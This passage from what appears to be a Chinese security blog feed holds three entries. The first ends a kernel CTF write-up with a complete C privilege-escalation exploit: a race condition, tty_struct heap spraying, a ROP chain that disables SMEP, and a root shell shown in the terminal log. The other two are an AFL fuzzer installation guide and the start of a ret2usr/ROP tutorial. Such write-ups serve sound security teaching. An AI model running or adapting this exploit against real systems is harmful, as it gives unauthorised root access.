class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="comment">//#define commit_cred  0xffffffff810a1430</span></span><br><span class="line"><span class="comment">//#define prepare_kernel_cred  0xffffffff810a1820</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (*_commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (*_prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">int</span> spray_fd[<span class="number">0x100</span>];</span><br><span class="line"><span class="keyword">size_t</span> buf[<span class="number">3</span>] =&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *(*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *, <span class="title">struct</span> <span class="title">file</span> *, <span class="title">int</span>);</span> <span class="comment">/*     0     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*install)(struct tty_driver *, struct tty_struct *);              <span class="comment">/*     8     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *, struct tty_struct *);              <span class="comment">/*    16     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*open)(struct tty_struct *, struct file *);                       <span class="comment">/*    24     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct *, struct file *);                     <span class="comment">/*    32     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *);                                 <span class="comment">/*    40     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *);                                  <span class="comment">/*    48     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*write)(struct tty_struct *, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">int</span>);         <span class="comment">/*    56     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">    <span class="keyword">int</span> (*put_char)(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">char</span>);                            <span class="comment">/*    64     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *);                                       <span class="comment">/*    72     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*write_room)(struct tty_struct *);                                         <span class="comment">/*    80     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*chars_in_buffer)(struct tty_struct *);                                    <span class="comment">/*    88     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*ioctl)(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>);             <span class="comment">/*    96     8 */</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">int</span> <span class="params">(*compat_ioctl)</span><span class="params">(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>)</span></span>; <span class="comment">/*   104     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *, struct ktermios *);                    <span class="comment">/*   112     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct *);                                          <span class="comment">/*   120     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 2 boundary (128 bytes) --- */</span></span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct *);           <span class="comment">/*   128     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *);                 <span class="comment">/*   136     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *);                <span class="comment">/*   144     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *);               <span class="comment">/*   152     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *, <span class="keyword">int</span>);        <span class="comment">/*   160     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *);         <span class="comment">/*   168     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *);            <span class="comment">/*   176     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *, <span class="keyword">int</span>); <span class="comment">/*   184     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 3 boundary (192 bytes) --- */</span></span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *, <span class="keyword">char</span>);                           <span class="comment">/*   192     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *);                                    <span class="comment">/*   200     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);        <span class="comment">/*   208     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *, struct winsize *);                    <span class="comment">/*   216     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *, struct termiox *);               <span class="comment">/*   224     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); <span class="comment">/*   232     8 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span>                                 <span class="comment">/*   240     8 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* size: 248, cachelines: 4, members: 31 */</span></span><br><span class="line">    <span class="comment">/* last cacheline: 56 bytes */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">"sh"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> <span class="title">fake_ops</span>;</span></span><br><span class="line"><span class="keyword">int</span> fff = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">char</span> fake_procfops[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss,user_rflags, user_sp ,user_gs,user_es,user_fs,user_ds;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">    <span class="string">"mov %%cs, %0\n"</span></span><br><span class="line">    <span class="string">"mov %%ss,%1\n"</span></span><br><span class="line">    <span class="string">"mov %%rsp,%2\n"</span></span><br><span class="line">    <span class="string">"pushfq\n"</span></span><br><span class="line">    <span class="string">"pop %3\n"</span></span><br><span class="line">    <span class="string">"mov %%gs,%4\n"</span></span><br><span class="line">    <span class="string">"mov %%es,%5\n"</span></span><br><span class="line">    <span class="string">"mov %%fs,%6\n"</span></span><br><span class="line">    <span class="string">"mov %%ds,%7\n"</span>  </span><br><span class="line">    ::<span class="string">"m"</span>(user_cs),<span class="string">"m"</span>(user_ss),<span class="string">"m"</span>(user_sp),<span class="string">"m"</span>(user_rflags),<span class="string">"m"</span>(user_gs),<span class="string">"m"</span>(user_es),<span class="string">"m"</span>(user_fs),<span class="string">"m"</span>(user_ds)</span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*]status has been saved."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">void get_root()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    void * (*pkc)(int) = (void *(*)(int))prepare_kernel_cred;</span></span><br><span class="line"><span class="comment">    void (*cc)(void *) = (void (*)(void * ))commit_cred;</span></span><br><span class="line"><span class="comment">    (*cc)((*pkc)(0));</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">size_t</span>*a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(fff==<span class="number">1</span>)&#123;</span><br><span class="line">        *a=<span class="number">0x2e0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">   _commit_creds commit_creds=<span class="number">0xffffffff810ad430</span>;</span><br><span class="line">    _prepare_kernel_cred prepare_kernel_cred=<span class="number">0xffffffff810ad7e0</span>;</span><br><span class="line"><span class="comment">//cd ./core/tmp &amp;&amp; gcc exp.c -pthread --static  -g -o exp &amp;&amp; cd .. &amp;&amp; ./gen_cpio.sh initramfs.cpio &amp;&amp; cd .. &amp;&amp; ./startvm.sh</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sudo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"push %0\n"</span></span><br><span class="line">        <span class="string">"push %1\n"</span></span><br><span class="line">        <span class="string">"push %2\n"</span></span><br><span class="line">        <span class="string">"push %3\n"</span></span><br><span class="line">        <span class="string">"push %4\n"</span></span><br><span class="line">        <span class="string">"push $0\n"</span></span><br><span class="line">        <span class="string">"swapgs\n"</span></span><br><span class="line">        <span class="string">"pop %%rbp\n"</span></span><br><span class="line">        <span class="string">"iretq\n"</span>    </span><br><span class="line">        ::<span class="string">"m"</span>(user_ss),<span class="string">"m"</span>(user_sp),<span class="string">"m"</span>(user_rflags),<span class="string">"m"</span>(user_cs),<span class="string">"a"</span>(&amp;get_shell)    </span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *buf2 = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">int</span> fd  = open(<span class="string">"/dev/noob"</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">pthread_t</span> t1;</span><br><span class="line">    pthread_create(&amp;t1,<span class="literal">NULL</span>,change,&amp;buf[<span class="number">2</span>]);</span><br><span class="line">    buf[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">2</span>]=<span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100000</span>;i++)</span><br><span class="line">    &#123;   buf[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        ioctl(fd,<span class="number">0x30000</span>,buf);</span><br><span class="line">    &#125;</span><br><span class="line">    fff=<span class="number">0</span>;</span><br><span class="line">    pthread_join(t1,<span class="literal">NULL</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,buf);</span><br><span class="line">    <span class="comment">/*close(fd);</span></span><br><span class="line"><span class="comment">    int pid = fork();</span></span><br><span class="line"><span class="comment">    if(pid &lt; 0)&#123;</span></span><br><span class="line"><span class="comment">        puts("fork error");</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    else if(pid==0)&#123;</span></span><br><span class="line"><span class="comment">        char zeros[30] = &#123;0&#125;;</span></span><br><span class="line"><span class="comment">        buf[2] = 28;</span></span><br><span class="line"><span class="comment">        buf[1] = (size_t) zeros;</span></span><br><span class="line"><span class="comment">        ioctl(fd2,0x30002,buf);</span></span><br><span class="line"><span class="comment">        if(getuid==0)&#123;</span></span><br><span class="line"><span class="comment">            puts("[+] root now.");</span></span><br><span class="line"><span class="comment">system("/bin/sh");</span></span><br><span class="line"><span class="comment">exit(0);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else&#123;</span></span><br><span class="line"><span class="comment">            puts("[*]fail");</span></span><br><span class="line"><span class="comment">            exit(0);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    else&#123;</span></span><br><span class="line"><span class="comment">        wait(NULL);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">size_t</span> xchgeaxesp=<span class="number">0xffffffff8101db17</span>;;<span class="comment">//0xffffffff81007808;</span></span><br><span class="line">   <span class="keyword">size_t</span> fake_stack=xchgeaxesp&amp;<span class="number">0xffffffff</span>;  </span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(mmap((<span class="keyword">void</span>*)(fake_stack&amp;<span class="number">0xfffff000</span>), <span class="number">0x3000</span>, <span class="number">7</span>, <span class="number">0x22</span>, <span class="number">-1</span>, <span class="number">0</span>)!=(fake_stack&amp;<span class="number">0xfffff000</span>))&#123; <span class="comment">//这里是mmap地址</span></span><br><span class="line">       perror(<span class="string">"mmap"</span>);</span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">size_t</span> rop[] = </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xffffffff813f6c9d</span>,     <span class="comment">// pop rdi; ret;</span></span><br><span class="line">        <span class="number">0x6f0</span>,                  <span class="comment">// cr4 with smep disabled</span></span><br><span class="line">        <span class="number">0xffffffff81069b14</span>,     <span class="comment">// mov cr4, rdi; ret;</span></span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        (<span class="keyword">size_t</span>) sudo</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;fake_ops, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_ops));<span class="comment">//把rop写栈中</span></span><br><span class="line">    <span class="built_in">memset</span>(fake_procfops, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_procfops));</span><br><span class="line">    fake_ops.proc_fops = &amp;fake_procfops;</span><br><span class="line">    fake_ops.ioctl = xchgeaxesp;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)fake_stack, rop, <span class="keyword">sizeof</span>(rop));</span><br><span class="line">    <span class="keyword">size_t</span> buf_e[<span class="number">0x20</span>/<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        spray_fd[i] = open(<span class="string">"/dev/ptmx"</span>,O_RDWR|O_NOCTTY);</span><br><span class="line">        <span class="keyword">if</span>(spray_fd[i]&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            perror(<span class="string">"open tty"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] Reading buffer content from kernel buffer"</span>);</span><br><span class="line">    buf[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">1</span>]=(<span class="keyword">size_t</span>)buf_e;</span><br><span class="line">    buf[<span class="number">2</span>]=<span class="number">0x20</span>;</span><br><span class="line">    ioctl(fd, <span class="number">0x30003</span>, buf);</span><br><span class="line">    buf_e[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;fake_ops;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%lx\n"</span>,buf_e[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(fd, <span class="number">0x30002</span>, buf);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        ioctl(spray_fd[i],<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Welcome :)</span><br><span class="line">~ $ id</span><br><span class="line">uid=1000(pwn) gid=1000 groups=1000</span><br><span class="line">~ $ /tmp/exp</span><br><span class="line">exp      exp.c    exp1.c   expliot</span><br><span class="line">~ $ /tmp/expliot </span><br><span class="line">[*]status has been saved.</span><br><span class="line">[+] Reading buffer content from kernel buffer</span><br><span class="line">100005401</span><br><span class="line">0</span><br><span class="line">ffff88000620f0c0</span><br><span class="line">6e23a0</span><br><span class="line"></span><br><span class="line">/home/pwn # id</span><br><span class="line">uid=0(root) gid=0</span><br><span class="line">/home/pwn #</span><br></pre></td></tr></table></figure><p>补充：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ptmx设备是tty设备的一种,open函数被tty核心调用, 当一个用户对这个tty驱动被分配的设备节点调用open时tty核心使用一个指向分配给这个设备的tty_struct结构的指针调用它,也就是说我们在调用了open函数了之后会创建一个`tty_struct`结构体,然而最关键的是这个tty_struct也是通过kmalloc申请出来的一个堆空间</span><br><span class="line">for --钞sir师傅</span><br></pre></td></tr></table></figure><p>这次比赛的kernel还是用到最常见的uaf，越界访问。足以看出其实kernel pwn和用户态的pwn 利用点是差不多的，主要是在利用方式。kernel pwn有很多可以利用的结构体之类的数据结构，也涉及到了进程和线程间通信的问题。往往比较复杂。<br>最后一道还有可以修复modprobe_path指向一个错误的二进制文件进行getshell。<br>感谢 peanuts师傅的指导</p><p>参考链接<br><a href="http://blog.lujun9972.win/blog/2018/08/03/%E5%A6%82%E4%BD%95%E7%A6%81%E6%AD%A2%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%9F%A5%E7%9C%8Bdmesg%E4%BF%A1%E6%81%AF/index.html" target="_blank" rel="noopener">dmesg_restrict</a><br><a href="https://blog.csdn.net/flyingnosky/article/details/97407811" target="_blank" rel="noopener">kptr_restrict</a><br><a href="http://mask6asok.top/2020/02/06/Linux_Kernel_Pwn_4.html" target="_blank" rel="noopener">double fetch</a><br><a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">一道简单内核题入门内核利用</a><br><a href="https://xz.aliyun.com/t/5847" target="_blank" rel="noopener">绕过smep</a><br><a href="https://kirin-say.top/2020/03/10/Kernoob-kmalloc-without-SMAP/" target="_blank" rel="noopener">modprobe_path</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL安装</title>
      <link href="/2020/02/14/AFL%E5%AE%89%E8%A3%85/"/>
      <url>/2020/02/14/AFL%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a>`afl`是fuzz里面比较老的一个工具，并且很出名。afl更加侧重于源码编译的c和c++程序。afl通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率，大致流程如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">①从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）</span><br><span class="line"></span><br><span class="line">②选择一些输入文件，作为初始测试集加入输入队列（queue）</span><br><span class="line"></span><br><span class="line">③将队列中的文件按一定的策略进行“突变”</span><br><span class="line"></span><br><span class="line">④如果经过变异文件更新了覆盖范围，则将其保留添加到队列中</span><br><span class="line"></span><br><span class="line">⑤上述过程会一直循环进行，期间触发了crash的文件会被记录下来</span><br></pre></td></tr></table></figure><p>首先在<a href="http://releases.llvm.org/download.html" target="_blank" rel="noopener">llvm</a>里面下载llvm源码<br>一般下载下面4个包就ok</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">LLVM source code (.sig)</span><br><span class="line">Clang source code (.sig)</span><br><span class="line">clang-tools-extra (.sig)</span><br><span class="line">compiler-rt source code (.sig)</span><br></pre></td></tr></table></figure><p>然后解压，把名字改掉，放到对应的目录里面就欧克</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv Clang llvm/tools</span><br><span class="line">mv extra llvm/tools/Clang</span><br><span class="line">mv compiler llvm/project</span><br></pre></td></tr></table></figure><p>然后在 另一个目录里面新建一个build文件夹，在里面进行编译，防止代码污染。cmake编译的时候选release编译会比较快，带debug的很慢。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -G &quot;Unix Makefiles&quot; -DLLVM_ENABLE_ASSERTIONS=On -DCMAKE_BUILD_TYPE=Release ../llvm</span><br><span class="line">make -j4</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>装llvm和clang环境就可以开始</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd afl</span><br><span class="line">make</span><br><span class="line">install</span><br><span class="line">cd llvm_mode</span><br><span class="line">mkdir test_build</span><br><span class="line">make</span><br><span class="line">cd ..</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>在编译的时候要用afl-gcc来代替gcc，对程序进行插桩<br><a href="https://xz.aliyun.com/t/1541" target="_blank" rel="noopener">参考链接</a><br><a href="https://blog.csdn.net/Wang_shiling/article/details/80164661" target="_blank" rel="noopener">参考链接</a></p>]]></content>
      
      
      <categories>
          
          <category> Fuzzing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Automation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel pwn ret2usr and rop</title>
      <link href="/2020/02/12/kernel-pwn-ret2usr-and-rop/"/>
      <url>/2020/02/12/kernel-pwn-ret2usr-and-rop/</url>
      
        <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><h3 id="一些前置知识"><a href="#一些前置知识" class="headerlink" title="一些前置知识"></a>一些前置知识</h3><h4 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">       ioctl - control device</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       #include &lt;sys/ioctl.h&gt;</span><br><span class="line"></span><br><span class="line">       int ioctl(int fd, unsigned long request, ...);</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       The ioctl() system call manipulates the underlying device parameters of special</span><br><span class="line">       files.  In particular, many  operating  characteristics  of  character  special</span><br><span class="line">       files  (e.g., terminals) may be controlled with ioctl() requests.  The argument</span><br><span class="line">       fd must be an open file descriptor.</span><br><span class="line"></span><br><span class="line">       The second argument is a device-dependent request code.  The third argument  is</span><br><span class="line">       an  untyped  pointer  to  memory.  It&apos;s traditionally char *argp (from the days</span><br><span class="line">       before void * was valid C), and will be so named for this discussion.</span><br><span class="line"></span><br><span class="line">       An ioctl() request has encoded in it whether the argument is an in parameter or</span><br><span class="line">       out  parameter, and the size of the argument argp in bytes.  Macros and defines</span><br><span class="line">       used in specifying an ioctl() request are located in the file &lt;sys/ioctl.h&gt;.</span><br></pre></td></tr></table></figure><p>ioctl 就是用于设备间的通信，第一参数是打开设备时返回的文件描述符。第二个参数就是用户程序对设备的控制命令，后面是一些补充的命令。</p><h4 id="状态切换"><a href="#状态切换" class="headerlink" title="状态切换"></a>状态切换</h4><h5 id="从user-space-to-kernel-space"><a href="#从user-space-to-kernel-space" class="headerlink" title="从user space to kernel space"></a>从user space to kernel space</h5><p>当发生 <code>系统调用</code>，<code>产生异常</code>,<code>外设产生中断</code>等事件的时候，就会发生用户态到内核太的切换，<br>具体的过程为：<br>· 通过<code>swapgs</code>切换GS段寄存器，将GS寄存器和一个特定的位置的值进行交换，目的是保持当前的GS值，同时将该位置作为内核执行时的GS值使用。<br>· 将当前的栈顶(用户空间栈顶)记录在CPU独占的变量区域里，将CPU独占区域里记录的内核栈顶放入rsp/esp<br>· 通过push保存各寄存器，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line"> /* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line">    </span><br><span class="line"> /* 保存栈值，并设置内核栈 */</span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span><br><span class="line">/* Construct struct pt_regs on stack */</span><br><span class="line">pushq  $__USER_DS      /* pt_regs-&gt;ss */</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS      /* pt_regs-&gt;cs */</span><br><span class="line">pushq  %rcx             /* pt_regs-&gt;ip */</span><br><span class="line">pushq  %rax             /* 